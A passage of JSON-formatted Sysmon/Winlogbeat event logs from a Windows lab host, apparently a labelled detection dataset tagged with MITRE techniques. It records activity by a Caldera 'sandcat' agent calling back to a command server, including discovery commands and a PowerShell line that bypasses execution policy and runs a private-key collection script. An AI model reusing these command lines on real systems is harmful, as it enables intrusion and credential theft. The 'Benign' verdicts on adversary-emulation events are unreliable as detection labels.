11:09:48.391\nProcessGuid: {04787c88-fffc-623a-af01-000000000c00}\nProcessId: 5908\nImage: C:\\Windows\\System32\\net.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: net.exe\nCommandLine: net  start\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=5B9EA3C45A11D4AEB1B1AC0F72C4C19308FC7D0B,MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07\nParentProcessGuid: {04787c88-fffc-623a-ae01-000000000c00}\nParentProcessId: 3952\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd.exe /C net start\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5908,"thread":null,"entity_id":"{04787c88-fffc-623a-af01-000000000c00}","executable":"C:\\Windows\\System32\\net.exe","name":"net.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8950,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:49.798Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:09:48.402Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\nUtcTime: 2022-03-23 11:09:48.402\nProcessGuid: {04787c88-fffc-623a-b001-000000000c00}\nProcessId: 4912\nImage: C:\\Windows\\System32\\net1.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: net1.exe\nCommandLine: C:\\Windows\\system32\\net1  start\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=F0DEA8E671AADFBBF76E6E4A8A9118195961C3CB,MD5=0F641F87A791AE07C00A725BBBD77724,SHA256=286E7F127B06386BD1CC9664851848F483A867F0F604AA352893151068715FAA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E\nParentProcessGuid: {04787c88-fffc-623a-af01-000000000c00}\nParentProcessId: 5908\nParentImage: C:\\Windows\\System32\\net.exe\nParentCommandLine: net  start\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4912,"thread":null,"entity_id":"{04787c88-fffc-623a-b001-000000000c00}","executable":"C:\\Windows\\System32\\net1.exe","name":"net1.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8951,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:09:49.798Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:10:27.410Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\nUtcTime: 2022-03-23 11:10:27.410\nProcessGuid: {04787c88-0023-623b-b101-000000000c00}\nProcessId: 3896\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd.exe /C systeminfo\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=A1DBD4949DF9E892E52201B06A2D24AA5082B3D5,MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {04787c88-fdd6-623a-7601-000000000c00}\nParentProcessId: 4192\nParentImage: C:\\Users\\Public\\sandcat.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.exe\" -server http://192.168.56.104:8888 -group diy_eval\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":3896,"thread":null,"entity_id":"{04787c88-0023-623b-b101-000000000c00}","executable":"C:\\Windows\\System32\\cmd.exe","name":"cmd.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8952,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:10:29.380Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:10:27.411Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 11:10:27.411\nSourceProcessGUID: {04787c88-fdd6-623a-7601-000000000c00}\nSourceProcessId: 4192\nSourceThreadId: 6796\nSourceImage: C:\\Users\\Public\\sandcat.exe\nTargetProcessGUID: {04787c88-0023-623b-b101-000000000c00}\nTargetProcessId: 3896\nTargetImage: C:\\Windows\\system32\\cmd.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.exe+641de\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4192,"thread":{"id":6796},"entity_id":"{04787c88-fdd6-623a-7601-000000000c00}","executable":"C:\\Users\\Public\\sandcat.exe","name":"sandcat.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8953,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:10:29.380Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:10:27.420Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1033,technique_name=System Owner/User Discovery\nUtcTime: 2022-03-23 11:10:27.420\nProcessGuid: {04787c88-0023-623b-b201-000000000c00}\nProcessId: 1784\nImage: C:\\Windows\\System32\\systeminfo.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Displays system information\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: sysinfo.exe\nCommandLine: systeminfo\nCurrentDirectory: C:\\Windows\\system32\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=BB6CD4B5CFE97EB64C071ADA39AC3B5F2F252FD6,MD5=4E678D82DDE61AAACA201F9636507F9E,SHA256=F5B4FB293ADA97A8C4B92BB380747DA1D71336F144332C95DDEF3F8522F7CE87,IMPHASH=C5985EAB8C1ED292344936A4595C1438\nParentProcessGuid: {04787c88-0023-623b-b101-000000000c00}\nParentProcessId: 3896\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd.exe /C systeminfo\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":1784,"thread":null,"entity_id":"{04787c88-0023-623b-b201-000000000c00}","executable":"C:\\Windows\\System32\\systeminfo.exe","name":"systeminfo.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8954,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:10:29.380Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:10:28.576Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\nUtcTime: 2022-03-23 11:10:28.576\nProcessGuid: {04787c88-0024-623b-b301-000000000c00}\nProcessId: 7048\nImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: WMI Provider Host\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Wmiprvse.exe\nCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\LOCAL SERVICE\nLogonGuid: {04787c88-ea51-623a-e503-000000000000}\nLogonId: 0x3E5\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1=51B8646308EE0B68AD1F7F1291B85395434DE49A,MD5=801E8003C257C8F540B20F1E0DECD3A6,SHA256=A75C85F3B089993E9C042FB82ECB7757E8F460ED8065FC7991CAA38A6DE0F50C,IMPHASH=CC058866636CC184AD452F88EE39368A\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 816\nParentImage: -\nParentCommandLine: -\nParentUser: -","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":7048,"thread":null,"entity_id":"{04787c88-0024-623b-b301-000000000c00}","executable":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","name":"WmiPrvSE.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8955,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:10:30.414Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:10:28.599Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\nUtcTime: 2022-03-23 11:10:28.599\nProcessGuid: {04787c88-0024-623b-b301-000000000c00}\nProcessId: 7048\nImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\nImageLoaded: C:\\Windows\\System32\\wbem\\wmiutils.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: WMI\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: wmiutils.dll\nHashes: SHA1=BC609D0AE8E4D79DC586A784DA6E660C25411BAE,MD5=9639A13D44802D3060BAB0072EB7945A,SHA256=45446583DDBD1DA38B545603AF62E305F13DD480B09F4A689BE4ADC98BC4A4AF,IMPHASH=0D31E6D27B954AD879CB4DF742982F1A\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\nUser: NT AUTHORITY\\LOCAL SERVICE","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":7048,"thread":null,"entity_id":"{04787c88-0024-623b-b301-000000000c00}","executable":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","name":"WmiPrvSE.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":8956,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:10:30.414Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:10:34.592Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:10:34.592\nProcessGuid: {04787c88-002a-623b-b601-000000000c00}\nProcessId: 3148\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"Import-PfxCertificate -Exportable -FilePath \\\".\\dmevals.local.pfx\\\" -CertStoreLocation Cert:\\LocalMachine\\My;if (! $(test-path -path \\\"C:\\Program Files\\SysinternalsSuite\\\")) {  write-host \\\"[!] The path C:\\Program Files\\SysinternalsSuite does not exist. Execution has stopped.\\\";  exit 1;}Set-Location -path \\\"C:\\Program Files\\SysinternalsSuite\\\";. .\\readme.ps1;Get-PrivateKeys;if ($? -eq $True) {    write-host \\\"[+] Successfully executed private key collection script.\\\";    exit 0;} else {    write-host \\\"[!] Error, could not execution Get-PrivateKeys.\\\";    exit 1;}\"\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\nParentProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nParentProcessId: 5344\nParentImage: C:\\Users\\Public\\sandcat.go-windows.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.go-windows.exe\" -server http://192.168.56.104:8888 -group red -listenP2P -v \nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":3148,"thread":null,"entity_id":"{04787c88-002a-623b-b601-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8957,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:10:36.487Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:10:34.592Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 11:10:34.592\nSourceProcessGUID: {04787c88-f96f-623a-ea00-000000000c00}\nSourceProcessId: 5344\nSourceThreadId: 1468\nSourceImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetProcessGUID: {04787c88-002a-623b-b601-000000000c00}\nTargetProcessId: 3148\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.go-windows.exe+644be\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":{"id":1468},"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8958,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:10:36.488Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},